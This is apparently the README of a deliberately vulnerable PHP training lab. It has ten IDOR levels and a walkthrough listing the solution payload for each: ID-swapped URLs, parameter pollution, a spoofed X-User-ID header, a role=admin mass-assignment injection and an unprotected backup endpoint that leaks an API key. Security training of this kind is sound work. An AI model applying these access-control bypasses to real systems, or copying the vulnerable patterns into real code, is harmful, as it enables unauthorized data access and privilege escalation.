# 🛡️ IDOR Masterclass Suite (10 Levels)

> **⚠️ WARNING: EDUCATIONAL PURPOSES ONLY**
> This repository contains intentionally vulnerable code designed for security training and educational purposes. **DO NOT** deploy this code in a production environment. Hosting this environment on a public-facing server without strict isolation (e.g., containerization, network segmentation) is dangerous and can lead to server compromise.

---

[![Security Level: Educational](https://img.shields.io/badge/Security_Level-Educational-blue.svg)]()
[![PHP](https://img.shields.io/badge/Language-PHP-777bb4.svg)]()

Welcome to the **IDOR Masterclass Lab Suite**. This comprehensive, self-contained training arena contains 10 levels of increasing complexity, taking you from fundamental sequential parameter manipulation to advanced JSON payload editing, nested REST API flaws, Mass Assignments, and custom HTTP header spoofing.

---

## 🎯 Lab Overview

| Level | Name | Primary Vulnerability |
| :--- | :--- | :--- |
| 🟢 | **Level 1** | Numeric Parameter IDOR |
| 🟢 | **Level 2** | Non-Numeric Hash Lookup (Obscurity) |
| 🟡 | **Level 3** | JSON Payload IDOR |
| 🟡 | **Level 4** | Blind Metadata Exfiltration |
| 🔴 | **Level 5** | HTTP Parameter Pollution (Gateway Bypass) |
| 🔴 | **Level 6** | State-Changing Write IDOR |
| 🔴 | **Level 7** | Header-Based IDOR / Identity Spoofing |
| 🔴 | **Level 8** | REST Nested Resource Authorization Flaw |
| 🟣 | **Level 9** | Mass Assignment / Property Injection |
| 🟣 | **Level 10** | API Key Hijacking Logic Chain |

---

## 🚀 Quick Start

Ensure you have [PHP](https://www.php.net/) installed on your system.

```bash
# 1. Clone the repository (or copy the files)
git clone https://github.com/zoly-zoly/IDOR-Lab.git
cd idor-lab

# 2. Start the local server
# (You can use any available port)
php -S localhost:8080
```

👉 **Access the lab at:** `http://localhost:8080`

---

## 📓 Lab Walkthrough & Solutions

### 🟢 LEVEL 1: Numeric Parameter IDOR
*   **Vulnerability:** Simple sequential database identifiers represent user invoices.
*   **Exploit URL:**
    ```text
    http://localhost:8080/level1.php?id=1002
    ```
*   **Why it works:** The backend pulls the invoice matching `id=1002` (Bob's invoice) directly without checking if the invoice belongs to the currently authenticated user session (Alice - ID 1).

---

### 🟢 LEVEL 2: Non-Numeric Hash Lookup
*   **Vulnerability:** Sequential IDs were replaced by unpredictable string keys (e.g. `doc_99a8b1`), but the backend still lacks actual authorization controls, and keys are leaked on public endpoints.
*   **Exploit URL:**
    ```text
    http://localhost:8080/level2.php?doc=doc_5e4d3c
    ```
*   **Why it works:** Security through obscurity fails. Once Bob's private document hash (`doc_5e4d3c`) is captured, submitting it leaks his Zero-Gravity engine blueprint content.

---

### 🟡 LEVEL 3: JSON Payload IDOR
*   **Vulnerability:** Input parameters are packed into POST-based JSON entities, but validated weakly on the server.
*   **Exploit Payload (JSON POST):**
    ```json
    { "id": 1002 }
    ```
*   **Why it works:** The API decoder extracts the numeric ID parameter from the raw POST payload, failing to verify permission bounds.

---

### 🟡 LEVEL 4: Blind Metadata Exfiltration
*   **Vulnerability:** No private file values are printed back directly on success.
*   **Exploit URL:**
    ```text
    http://localhost:8080/level4.php?id=1002
    ```
*   **Why it works:** Even if names or contents are hidden, the server still confirms the exact status and pricing tiers of other users' records, enabling bulk billing harvest.

---

### 🔴 LEVEL 5: HTTP Parameter Pollution
*   **Vulnerability:** A pre-validation gateway checks the first `id` parameter (belonging to Alice), but PHP natively executes the *last* duplicate parameter (belonging to Bob).
*   **Exploit URL:**
    ```text
    http://localhost:8080/level5.php?id=1001&id=1002
    ```
*   **Why it works:** Multi-tiered parser discrepancies allow you to bypass authorization proxies entirely!

---

### 🔴 LEVEL 6: State-Changing Write IDOR
*   **Vulnerability:** The server handles profile writes (updates) based strictly on user-supplied `id` parameters in the body of a POST request.
*   **Exploit Payload (POST):**
    ```text
    action=update_note&id=2&note=Hacked_Bob_Note_Content
    ```
*   **Why it works:** Lack of write-level authorization allows any user to modify database values on any target record.

---

### 🔴 LEVEL 7: Header-Based IDOR
*   **Vulnerability:** The application trustingly reads client-supplied custom headers (like `X-User-ID`) to identify users behind an API Gateway.
*   **Exploit Payload (HTTP Headers):**
    ```http
    X-User-ID: 100
    ```
*   **Why it works:** Since headers are fully controllable by the client, spoofing this header allows you to assume the identity of the administrator.

---

### 🔴 LEVEL 8: REST Nested Resource Authorization Flaw
*   **Vulnerability:** The nested structure (`level8.php?user_id=1&invoice_id=1002`) validates parent user permission on `user_id=1`, but blindly loads the sub-resource strictly based on `invoice_id=1002` alone.
*   **Exploit URL:**
    ```text
    http://localhost:8080/level8.php?user_id=1&invoice_id=1002
    ```

---

### 🟣 LEVEL 9: Mass Assignment
*   **Vulnerability:** Direct user-submitted POST maps are merged blindly into the session array without parameter whitelisting.
*   **Exploit Payload (POST Injection):**
    Add `role=admin` to your update form.
*   **Why it works:** The backend executes `array_merge($user, $_POST)`, allowing you to inject arbitrary properties and escalate your privilege level.

---

### 🟣 LEVEL 10: API Key Hijacking Chain (Final Boss)
*   **Vulnerability:** While standard key viewing endpoints are protected, the backend database-dump backup utility (<code>action=backup_profile</code>) lacks authorization checking.
*   **Exploit URL:**
    ```text
    http://localhost:8080/level10.php?action=backup_profile&id=2
    ```
*   **Why it works:** The secondary feature exposes the master secret (Bob's API key), completing a high-impact exfiltration chain.

---

## 🛡️ Security Policy & Disclaimer
Please see [SECURITY.md](SECURITY.md) for licensing and ethical usage instructions.

---
*Created with ❤️ by **Zoly** for Bug Bounty Mastery.*
